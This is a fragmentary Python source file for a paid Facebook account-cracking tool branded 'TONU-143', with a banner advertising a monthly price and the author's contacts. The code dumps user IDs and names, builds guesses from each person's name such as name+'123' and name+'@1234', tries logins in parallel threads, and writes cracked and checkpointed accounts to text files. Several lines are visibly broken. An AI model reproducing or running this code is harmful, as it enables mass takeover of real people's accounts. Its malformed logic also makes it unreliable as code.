	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mTONU-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mTONU-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				for yntkts in self.id:
					try:
						...
						if len(xz) == 1:
							...
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'2234']
						elif len(xz) == 11:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'223']
						elif len(xz) == 12:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"12345", xz[0]+'223']
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
			...
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"12345", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"12345", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"123456", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"142", xz[0]+"123456", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 5:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"123456", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 6:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"123456", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 7:
							pwx = [name, xz[0]+xz[1], xz[0]+"143", xz[0]+"1234567", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 8:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 9:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'223']
						elif len(xz) == 10:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'223']
			...
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"143", xz[0]+"12345", xz[0]+"1223"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"143", xz[0]+"1234", xz[0]+"223", xz[0]+"12345", xz[0]+"1223",xz[0]+"@143",xz[0]+"@12",xz[0]+"@123",xz[0]+"@1234" ,xz[0]+"@12345",xz[0]+"@123456", xz[0]+"@123", xz[0]+"123456", xz[0]+"1234567", xz[0]+"12345678", xz[0]+"12345679", xz[0]+"1234567910", xz[0]+"1234567911"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"143", xz[0]+"1234", xz[0]+"223", xz[0]+"12345", xz[0]+"1223",xz[0]+"@143",xz[0]+"@12",xz[0]+"@123",xz[0]+"@1234" ,xz[0]+"@12345",xz[0]+"@123456", xz[0]+"@123", xz[0]+"123456", xz[0]+"1234567", xz[0]+"12345678", xz[0]+"12345679", xz[0]+"1234567910", xz[0]+"1234567911"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"143", xz[0]+"1234", xz[0]+"223", xz[0]+"12345", xz[0]+"1223",xz[0]+"@143",xz[0]+"@12",xz[0]+"@123",xz[0]+"@1234" ,xz[0]+"@12345",xz[0]+"@123456", xz[0]+"@123", xz[0]+"123456", xz[0]+"1234567", xz[0]+"12345678", xz[0]+"12345679", xz[0]+"1234567910", xz[0]+"1234567911"]
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mTONU\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[TONU-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('TONU_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[TONU-CP] %s | %s%s      ' % (user,pw,tahun(user)))
			...
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"@123", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"@123", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"@123", xz[0]+"12345"]
		...
		with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
			for yntkts in self.id:
				try:
					...
					xz = name.split(' ')
					if len(xz) == 1:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'143', xz[0]+xz[0]+'1234']
					elif len(xz) == 2:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'143', xz[0]+xz[0]+'1234']
					elif len(xz) == 3:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'143', xz[0]+xz[0]+'1234']
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mAdi\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
$$$$$$$/          $$/             $/             $$$$$$/
  ...
  \033[1;37m|
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m TONU-143      │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m MEHEDI HASAN TONU  │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +8801759916221│\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m YOUTUBE \033[1;31m:\033[1;32m BD-TERMUX │\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37m•   \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
